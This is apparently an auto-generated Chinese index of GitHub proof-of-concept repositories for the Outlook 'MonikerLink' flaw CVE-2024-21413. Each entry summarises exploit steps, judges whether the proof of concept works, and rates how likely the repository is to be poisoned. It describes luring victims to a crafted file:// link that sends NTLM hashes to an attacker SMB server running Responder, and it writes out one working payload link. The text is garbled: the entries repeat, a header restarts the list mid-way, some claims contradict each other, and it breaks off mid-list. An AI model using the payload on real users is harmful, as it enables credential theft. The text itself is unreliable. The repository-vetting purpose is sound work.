**项目地址:** [DerZiad/CVE-2024-21413](https://github.com/DerZiad/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #6

**来源**: [CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md](../2024/CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE) / NTLM Hash Leak

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行、NTLM凭据泄露、横向移动和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021

**利用条件:** 用户需要点击恶意链接，攻击者可以通过构造恶意链接在电子邮件或其他Office文档中触发漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个关键安全漏洞，被称为“MonikerLink”。该漏洞允许攻击者绕过 Outlook 的内置保护机制，例如受保护视图，并利用 Moniker Link 泄露 NTLM 凭据，甚至可能执行远程代码。根据漏洞信息和搜索结果，该漏洞涉及对特定超链接处理不当的问题。攻击者可以通过在文件中构造恶意链接来利用此漏洞。

**利用方式：**

1.  **构造恶意链接：** 攻击者创建一个包含恶意 Moniker Link 的电子邮件或其他 Office 文档。该链接旨在利用 `MkParseDisplayName()` API 的行为。
2.  **绕过保护：** 通过在 `file://` URL 中使用 `!exploit` 等技巧绕过 Outlook 的 Protected View。
3.  **触发 SMB 身份验证：** 恶意链接指向攻击者控制的 SMB 服务器，从而触发受害者的 Outlook 尝试进行 SMB 身份验证。
4.  **捕获 NTLM 哈希：** 攻击者使用 Responder 等工具监听 SMB 身份验证请求，并捕获受害者的 NTLMv2 哈希。
5.  **潜在的 RCE：** 虽然目前没有公开可用的 RCE PoC，但该漏洞具有远程代码执行的潜力。

**有效性评估：**
提供的漏洞利用代码是一个关于如何利用 CVE-2024-21413 漏洞的说明文档和示例。它展示了使用 Python (smtplib) 发送包含恶意 Moniker Link 的电子邮件，并使用 Responder 捕获 NTLM 哈希的过程。根据 TryHackMe 挑战的完成状态，提供的 PoC 是有效的，可以成功利用该漏洞泄露 NTLM 哈希。

**投毒风险评估：**
该仓库主要是一个漏洞利用教程和概念验证，并没有明显的恶意代码。但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **潜在的细微修改：** 攻击者可能会在示例脚本中引入细微的修改，例如更改 SMB 服务器的 IP 地址或添加额外的恶意功能。尽管可能性不高，但仍然需要保持警惕。
*   **依赖的工具：** 该漏洞利用依赖于 Responder 等工具。如果攻击者修改了这些工具，可能会导致意外的行为或安全问题。

因此，综合评估投毒风险较低，但不能完全排除，可能性大约为10%。


**项目地址:** [MQKGitHub/Moniker-Link-CVE-2024-21413](https://github.com/MQKGitHub/Moniker-Link-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #7

**来源**: [CVE-2024-21413-MSeymenD_CVE-2024-21413.md](../2024/CVE-2024-21413-MSeymenD_CVE-2024-21413.md)

# CVE-2024-21413

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md](../2024/CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统被完全控制

**影响版本:** Office 2016版本小于 16.0.5435.1001，Office 2019、Microsoft 365 Apps for Enterprise、Office LTSC 2021 版本小于 https://aka.ms/OfficeSecurityReleases 指示的版本

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 'MonikerLink' 漏洞。攻击者可以通过发送包含特制 `file://` URL 的电子邮件来利用此漏洞，当用户点击该链接时，Outlook 会尝试访问该 URL 指向的文件，如果该 URL 指向攻击者控制的服务器，攻击者可以捕获 NTLM 哈希或触发其他恶意行为，甚至实现远程代码执行。

**漏洞利用有效性：**
根据提供的漏洞利用代码，该 POC 利用了 `file://` 协议处理不当的问题。POC 包含两个部分：使用 Responder 捕获 NTLM 哈希和使用 Python 脚本发送包含恶意 `file://` 链接的电子邮件。该方法利用了 Outlook 对 `file://` 协议的处理缺陷，在无需用户交互的情况下触发漏洞，因此判断POC具有有效性。

**投毒风险：**
该漏洞利用代码主要包含一个 Python 脚本，用于发送包含恶意链接的电子邮件。虽然脚本本身的功能是发送电子邮件，但其中包含的恶意链接可能导致受害者系统遭受攻击。Responder 工具用于捕获网络中的 NTLM 哈希，本身属于安全工具，但也被攻击者用于非法目的。该漏洞利用代码的主要风险在于利用邮件进行社工欺骗，诱导用户点击恶意链接。攻击者可以替换链接指向的恶意文件，执行任意命令，或者植入后门。该 POC 存在一定的投毒风险，评估为10%。

**利用方式：**
1.  攻击者使用 Responder 等工具监听网络，准备捕获 NTLM 哈希。
2.  攻击者构造包含恶意 `file://` 链接的电子邮件。链接指向攻击者控制的服务器或共享目录。
3.  攻击者将电子邮件发送给受害者。
4.  受害者打开电子邮件并点击恶意链接。
5.  Outlook 尝试访问该链接，导致 NTLM 认证信息泄露或触发其他恶意行为。
6. 攻击者可以利用捕获的 NTLM 哈希进行进一步的攻击，例如破解哈希或利用 Pass-the-Hash 技术。

**项目地址:** [ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413](https://github.com/ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #2

**来源**: [CVE-2024-21413-CMNatic_CVE-2024-21413.md](../2024/CVE-2024-21413-CMNatic_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016 (版本 < 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise，Microsoft Office LTSC 2021，具体版本范围参考漏洞库信息

**利用条件:** 无需用户交互即可触发

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。漏洞位于Outlook处理moniker链接的方式上，未经身份验证的远程攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在受害者的系统上执行任意代码，而无需用户交互。根据搜索引擎结果，此漏洞利用的复杂度较低，危害性极高。漏洞库信息显示 CVSS 评分为 9.8，属于危急漏洞。CISA 已将其添加到已知被利用漏洞目录（KEV）。

提供的漏洞利用代码只是一个Apache License 2.0的LICENSE文件,本身不包含任何漏洞利用代码，但根据搜索引擎结果中的 "github.com/ThemeHackers/CVE-2024-21413" 链接，推测存在公开可用的漏洞利用代码。 由于提供的代码仅仅是一个LICENSE文件，所以可以判定投毒风险为0%。

**利用方式：** 攻击者构造包含恶意 moniker 链接的电子邮件，当 Outlook 客户端解析该邮件时，会触发漏洞并执行攻击者预设的恶意代码，最终导致远程代码执行。

**项目地址:** [CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #3

**来源**: [CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md](../2024/CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #4

**来源**: [CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md](../2024/CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致信息泄露、远程代码执行和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本 < 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021（所有受支持版本，直至2024年2月更新）。

**利用条件:** 需要受害者使用 Microsoft Outlook 打开包含特制 file:// 链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一种 Microsoft Outlook 远程代码执行漏洞，也称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送包含恶意 `file://` 链接的电子邮件来远程执行代码。当用户点击该链接时，Outlook 会尝试连接到攻击者控制的 SMB 共享，这可能导致 NTLM 凭据泄露或未经授权访问本地文件。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性较高。CISA已将此漏洞添加到已知被利用的漏洞目录(KEV)中，表明该漏洞在野外已被积极利用。PoC代码提供了一种利用 `file://` 协议将受害者重定向到攻击者控制的 SMB 共享的方案，进一步验证了该漏洞的有效性。

**投毒风险：**
PoC代码主要包含利用脚本(exploitSendEmailOutlook.py, captureHashResponder.py)和辅助配置文件。`exploitSendEmailOutlook.py` 脚本用于发送包含恶意链接的电子邮件，`captureHashResponder.py` 用于启动 Responder 工具以捕获 NTLM 哈希。startServicesWindows.py用于快速启动漏洞验证环境.投毒风险主要存在于以下几个方面：

1.  **隐蔽的反向 Shell：** 攻击者可能在 `exploitSendEmailOutlook.py` 脚本中添加反向 Shell 代码，在受害者点击恶意链接时，在后台静默执行，从而控制受害者系统。
2.  **恶意 Responder 配置：** 攻击者可能修改 `captureHashResponder.py` 脚本，使其在捕获 NTLM 哈希的同时，执行其他恶意操作，例如下载并执行恶意文件。
3.  **供应链投毒：** 该 PoC 依赖于多个 Python 库（如 `pyautogui`、`Pillow`、`opencv-python` 和 `rich`）。攻击者可能通过篡改这些依赖库，植入恶意代码，从而影响所有使用该 PoC 的用户。

综合考虑，虽然 PoC 代码主要功能是演示漏洞利用，但存在潜在的投毒风险。攻击者可能利用代码中的可扩展性，添加恶意功能，或者通过篡改依赖库进行供应链投毒。因此，在使用该 PoC 时，务必进行代码审计，并从可信的源获取依赖库。

**利用方式：**
利用方式如下：

1.  **发送恶意邮件：** 攻击者构造一封包含恶意 `file://` 链接的电子邮件，并将其发送给受害者。
2.  **诱导点击链接：** 攻击者通过各种手段诱使受害者点击邮件中的恶意链接。
3.  **NTLM 凭据捕获/文件访问：** 受害者点击链接后，Outlook 会尝试连接到攻击者控制的 SMB 共享。Responder 工具会捕获受害者的 NTLMv2 哈希。或者，攻击者可以直接访问受害者本地文件（如果链接指向本地文件）。
4.  **代码执行 (可选)：** 攻击者可以进一步利用捕获的 NTLM 哈希进行密码破解，或者利用文件访问权限在受害者系统上执行恶意代码。

总而言之，CVE-2024-21413 是一个高危漏洞，利用方式简单，容易被攻击者利用。在使用该漏洞验证 PoC 时，必须在隔离环境中进行，并仔细审查代码，以防止被投毒。

**项目地址:** [D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB](https://github.com/D1se0/CVE-2024-21413-Vulnerabilidad-Outlook-LAB)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #5

**来源**: [CVE-2024-21413-DerZiad_CVE-2024-21413.md](../2024/CVE-2024-21413-DerZiad_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook RCE

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016、2019、LTSC 2021和Microsoft 365 Apps for Enterprise的特定版本

**利用条件:** 攻击者需要诱使用户打开恶意构造的电子邮件或者访问恶意链接

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413是一个Microsoft Outlook远程代码执行漏洞，无需用户交互即可触发。 根据搜索结果，该漏洞也被称为"MonikerLink" bug。漏洞利用方式通常涉及构造特殊的电子邮件，诱使用户打开或预览，从而在用户系统上执行任意代码。提供的漏洞利用代码仅仅是Apache License 2.0，不包含任何可执行代码，因此无法评估漏洞利用的有效性。但是，根据CVE信息和搜索结果，该漏洞的利用已经存在，并被CISA列入已知被利用漏洞目录。由于提供的代码只是许可证，因此不存在投毒风险。

**项目地址:** [DerZiad/CVE-2024-21413](https://github.com/DerZiad/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #6

**来源**: [CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md](../2024/CVE-2024-21413-MQKGitHub_Moniker-Link-CVE-2024-21413.md)

## CVE-2024-21413 - Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE) / NTLM Hash Leak

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行、NTLM凭据泄露、横向移动和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本低于 16.0.5435.1001), Microsoft Office 2019, Microsoft 365 Apps for Enterprise, Microsoft Office LTSC 2021

**利用条件:** 用户需要点击恶意链接，攻击者可以通过构造恶意链接在电子邮件或其他Office文档中触发漏洞。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个关键安全漏洞，被称为“MonikerLink”。该漏洞允许攻击者绕过 Outlook 的内置保护机制，例如受保护视图，并利用 Moniker Link 泄露 NTLM 凭据，甚至可能执行远程代码。根据漏洞信息和搜索结果，该漏洞涉及对特定超链接处理不当的问题。攻击者可以通过在文件中构造恶意链接来利用此漏洞。

**利用方式：**

1.  **构造恶意链接：** 攻击者创建一个包含恶意 Moniker Link 的电子邮件或其他 Office 文档。该链接旨在利用 `MkParseDisplayName()` API 的行为。
2.  **绕过保护：** 通过在 `file://` URL 中使用 `!exploit` 等技巧绕过 Outlook 的 Protected View。
3.  **触发 SMB 身份验证：** 恶意链接指向攻击者控制的 SMB 服务器，从而触发受害者的 Outlook 尝试进行 SMB 身份验证。
4.  **捕获 NTLM 哈希：** 攻击者使用 Responder 等工具监听 SMB 身份验证请求，并捕获受害者的 NTLMv2 哈希。
5.  **潜在的 RCE：** 虽然目前没有公开可用的 RCE PoC，但该漏洞具有远程代码执行的潜力。

**有效性评估：**
提供的漏洞利用代码是一个关于如何利用 CVE-2024-21413 漏洞的说明文档和示例。它展示了使用 Python (smtplib) 发送包含恶意 Moniker Link 的电子邮件，并使用 Responder 捕获 NTLM 哈希的过程。根据 TryHackMe 挑战的完成状态，提供的 PoC 是有效的，可以成功利用该漏洞泄露 NTLM 哈希。

**投毒风险评估：**
该仓库主要是一个漏洞利用教程和概念验证，并没有明显的恶意代码。但仍然存在一定的投毒风险，主要体现在以下几个方面：

*   **潜在的细微修改：** 攻击者可能会在示例脚本中引入细微的修改，例如更改 SMB 服务器的 IP 地址或添加额外的恶意功能。尽管可能性不高，但仍然需要保持警惕。
*   **依赖的工具：** 该漏洞利用依赖于 Responder 等工具。如果攻击者修改了这些工具，可能会导致意外的行为或安全问题。

因此，综合评估投毒风险较低，但不能完全排除，可能性大约为10%。


**项目地址:** [MQKGitHub/Moniker-Link-CVE-2024-21413](https://github.com/MQKGitHub/Moniker-Link-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #7

**来源**: [CVE-2024-21413-MSeymenD_CVE-2024-21413.md](../2024/CVE-2024-21413-MSeymenD_CVE-2024-21413.md)

# CVE-2024-21413

> 📦 该CVE有 **23** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md](../2024/CVE-2024-21413-ArtemCyberLab_Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413.md)

## CVE-2024-21413 Microsoft Outlook Remote Code Execution Vulnerability

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致远程代码执行和系统被完全控制

**影响版本:** Office 2016版本小于 16.0.5435.1001，Office 2019、Microsoft 365 Apps for Enterprise、Office LTSC 2021 版本小于 https://aka.ms/OfficeSecurityReleases 指示的版本

**利用条件:** 受害者需要点击攻击者发送的包含恶意链接的邮件

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 'MonikerLink' 漏洞。攻击者可以通过发送包含特制 `file://` URL 的电子邮件来利用此漏洞，当用户点击该链接时，Outlook 会尝试访问该 URL 指向的文件，如果该 URL 指向攻击者控制的服务器，攻击者可以捕获 NTLM 哈希或触发其他恶意行为，甚至实现远程代码执行。

**漏洞利用有效性：**
根据提供的漏洞利用代码，该 POC 利用了 `file://` 协议处理不当的问题。POC 包含两个部分：使用 Responder 捕获 NTLM 哈希和使用 Python 脚本发送包含恶意 `file://` 链接的电子邮件。该方法利用了 Outlook 对 `file://` 协议的处理缺陷，在无需用户交互的情况下触发漏洞，因此判断POC具有有效性。

**投毒风险：**
该漏洞利用代码主要包含一个 Python 脚本，用于发送包含恶意链接的电子邮件。虽然脚本本身的功能是发送电子邮件，但其中包含的恶意链接可能导致受害者系统遭受攻击。Responder 工具用于捕获网络中的 NTLM 哈希，本身属于安全工具，但也被攻击者用于非法目的。该漏洞利用代码的主要风险在于利用邮件进行社工欺骗，诱导用户点击恶意链接。攻击者可以替换链接指向的恶意文件，执行任意命令，或者植入后门。该 POC 存在一定的投毒风险，评估为10%。

**利用方式：**
1.  攻击者使用 Responder 等工具监听网络，准备捕获 NTLM 哈希。
2.  攻击者构造包含恶意 `file://` 链接的电子邮件。链接指向攻击者控制的服务器或共享目录。
3.  攻击者将电子邮件发送给受害者。
4.  受害者打开电子邮件并点击恶意链接。
5.  Outlook 尝试访问该链接，导致 NTLM 认证信息泄露或触发其他恶意行为。
6. 攻击者可以利用捕获的 NTLM 哈希进行进一步的攻击，例如破解哈希或利用 Pass-the-Hash 技术。

**项目地址:** [ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413](https://github.com/ArtemCyberLab/Project-NTLM-Hash-Capture-and-Phishing-Email-Exploitation-for-CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #2

**来源**: [CVE-2024-21413-CMNatic_CVE-2024-21413.md](../2024/CVE-2024-21413-CMNatic_CVE-2024-21413.md)

## CVE-2024-21413-Microsoft Outlook远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行

**影响应用:** Microsoft Outlook

**危害等级:** 高危，允许攻击者在受害者机器上执行任意代码

**影响版本:** 受影响版本包括Microsoft Office 2016 (版本 < 16.0.5435.1001)，Microsoft Office 2019，Microsoft 365 Apps for Enterprise，Microsoft Office LTSC 2021，具体版本范围参考漏洞库信息

**利用条件:** 无需用户交互即可触发

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中的一个远程代码执行漏洞，也被称为 "MonikerLink" 漏洞。漏洞位于Outlook处理moniker链接的方式上，未经身份验证的远程攻击者可以通过发送特制的电子邮件来利用此漏洞，从而在受害者的系统上执行任意代码，而无需用户交互。根据搜索引擎结果，此漏洞利用的复杂度较低，危害性极高。漏洞库信息显示 CVSS 评分为 9.8，属于危急漏洞。CISA 已将其添加到已知被利用漏洞目录（KEV）。

提供的漏洞利用代码只是一个Apache License 2.0的LICENSE文件,本身不包含任何漏洞利用代码，但根据搜索引擎结果中的 "github.com/ThemeHackers/CVE-2024-21413" 链接，推测存在公开可用的漏洞利用代码。 由于提供的代码仅仅是一个LICENSE文件，所以可以判定投毒风险为0%。

**利用方式：** 攻击者构造包含恶意 moniker 链接的电子邮件，当 Outlook 客户端解析该邮件时，会触发漏洞并执行攻击者预设的恶意代码，最终导致远程代码执行。

**项目地址:** [CMNatic/CVE-2024-21413](https://github.com/CMNatic/CVE-2024-21413)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #3

**来源**: [CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md](../2024/CVE-2024-21413-Cyber-Trambon_CVE-2024-21413-exploit.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 严重，可能导致信息泄露、NTLM凭据窃取和远程代码执行

**影响版本:** 受影响版本包括 Microsoft Office LTSC 2021、Microsoft 365 Apps for Enterprise、Microsoft Outlook 2016 和 Microsoft Office 2019。具体受影响版本请参考漏洞库信息。

**利用条件:** 攻击者需要能够通过电子邮件向目标用户发送特制邮件。

**POC 可用性:** 是

**投毒风险:** 30%

## 详情

CVE-2024-21413 是 Microsoft Outlook 中存在的一个远程代码执行漏洞，也称为 "MonikerLink" 漏洞。攻击者可以通过在电子邮件中嵌入特制的 `file://` 链接，绕过 Protected View 并执行恶意代码。 

**有效性：**
根据漏洞库信息和搜索结果，该漏洞被标记为严重，且存在在野利用。提供的 POC 代码利用了 `file://` 协议处理中的缺陷，通过构造恶意链接（例如 `file:///\\10.10.111.111\test\test.rtf!exploit`）来触发漏洞。POC 代码中给出了使用示例，表明该漏洞利用方式是有效的。

**投毒风险：**
POC 代码本身看起来是直接的，旨在利用该漏洞进行远程代码执行或者泄露NTLM凭据。但是，**存在以下几点需要注意**：
1.  **短链接风险**: POC 使用短链接 `https://shorturl.at/7itzw` 下载代码，这本身就是一个潜在的风险点。虽然当前链接可能指向合法的代码仓库，但攻击者可以随时更改短链接的目标地址，从而传播恶意软件。
2.  **Payload 可定制性**：该 POC 允许用户自定义 payload，这为潜在的恶意利用敞开了大门。用户可以将 payload 设置为下载和执行恶意代码，从而实现远程控制等目的。
3.  **隐蔽的后门植入**: 由于代码可以被修改,有可能被植入后门。

考虑到短链接带来的不确定性，Payload的可定制性，以及后门植入的可能性，存在30%的投毒风险。

**利用方式：**
1.  **构造恶意邮件：** 攻击者创建一个包含特制 `file://` 链接的电子邮件。
2.  **发送邮件：** 将该邮件发送给目标用户。
3.  **触发漏洞：** 当用户打开邮件时，Outlook 尝试解析 `file://` 链接。如果链接构造不当（例如包含 `!exploit`），则可能触发漏洞，导致执行恶意代码或泄露 NTLM 凭据。
4.  **远程代码执行或凭据窃取：** 如果成功利用该漏洞，攻击者可以执行任意代码或窃取用户的 NTLM 凭据，从而进一步控制受害者的系统。

综上所述，CVE-2024-21413 是一个严重的漏洞，利用方式相对简单，且存在有效的 POC 代码。企业应尽快应用 Microsoft 提供的补丁，以防止攻击者利用该漏洞进行攻击。

**项目地址:** [Cyber-Trambon/CVE-2024-21413-exploit](https://github.com/Cyber-Trambon/CVE-2024-21413-exploit)

**漏洞详情:** [CVE-2024-21413](https://nvd.nist.gov/vuln/detail/CVE-2024-21413)

---

## POC #4

**来源**: [CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md](../2024/CVE-2024-21413-D1se0_CVE-2024-21413-Vulnerabilidad-Outlook-LAB.md)

## CVE-2024-21413 - Microsoft Outlook 远程代码执行漏洞

**漏洞编号:** CVE-2024-21413

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Microsoft Outlook

**危害等级:** 高危，可能导致信息泄露、远程代码执行和权限提升

**影响版本:** 受影响版本包括 Microsoft Office 2016 (版本 < 16.0.5435.1001)、Microsoft Office 2019、Microsoft 365 Apps for Enterprise 和 Microsoft Office LTSC 2021（所有受支持版本，直至2024年2月更新）。

**利用条件:** 需要受害者使用 Microsoft Outlook 打开包含特制 file:// 链接的邮件。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2024-21413 是一种 Microsoft Outlook 远程代码执行漏洞，也称为 “MonikerLink” 漏洞。攻击者可以利用此漏洞通过发送包含恶意 `file://` 链接的电子邮件来远程执行代码。当用户点击该链接时，Outlook 会尝试连接到攻击者控制的 SMB 共享，这可能导致 NTLM 凭据泄露或未经授权访问本地文件。

**有效性：**
根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞利用的有效性较高。CISA已将此漏洞添加到已知被利用的漏洞目录(KEV)中，表明该漏洞在野外已被积极利用。PoC代码提供了一种利用 `file://` 协议将受害者重定向到攻击者控制的 SMB 共享的方案，进一步验证了该漏洞的有效性。

**投毒风险：**
PoC代码主要包含利用脚本(exploitSendEmailOutlook.py, captureHashResponder.py)和辅助配置文件。`exploitSendEmailOutlook.py` 脚本用于发送包含恶意链接的电子邮件，`captureHashResponder.py` 用于启动 Responder 工具以捕获 NTLM 哈希。startServicesWindows.py用于快速启动漏洞验证环境.投毒风险主要存在于以下几个方面：

1.  **隐蔽的反向 Shell：** 攻击者可能在 `exploitSendEmailOutlook.py` 脚本中添加反向 Shell 代码，在受害者点击恶意链接时，在后台静默执行，从而控制受害者系统。
2.  **恶意 Responder 配置：** 攻击者可能修改 `captureHashResponder.py` 脚本，使其在捕获 NTLM 哈希的同时，执行其他恶意操作，例如下载并执行恶意文件。
3.  **供应链投毒：** 该 PoC 依赖于多个 Python 库（如 `pyautogui`、`Pillow`、`opencv-python` 和 `rich`）。攻击者可能通过篡改这些依赖库，植入恶意代码，从而影响所有使用该 PoC 的用户。

综合考虑，虽然 PoC 代码主要功能是演示漏洞利用，但存在潜在的投毒风险。攻击者可能利用代码中的可扩展性，添加恶意功能，或者通过篡改依赖库进行供应链投毒。因此，在使用该 PoC 时，务必进行代码审计，并从可信的源获取依赖库。

**利用方式：**
利用方式如下：

1.  **发送恶意邮件：** 攻击者构造一封包含恶意 `file://` 链接的电子邮件，并将其发送给受害者。
2.  **诱导点击链接：** 攻击者通过各种手段诱使受害者点击邮件中的恶意链接。
3.  **NTLM 凭据捕获/文件访问：** 受害者点击链接后，Outlook 会尝试连接到攻击者控制的 SMB 共享。Responder 工具会捕获受害者的 NTLMv2 哈希。或者，攻击者可以直接访问受害者本地文件（如果链接指向本地文件）。
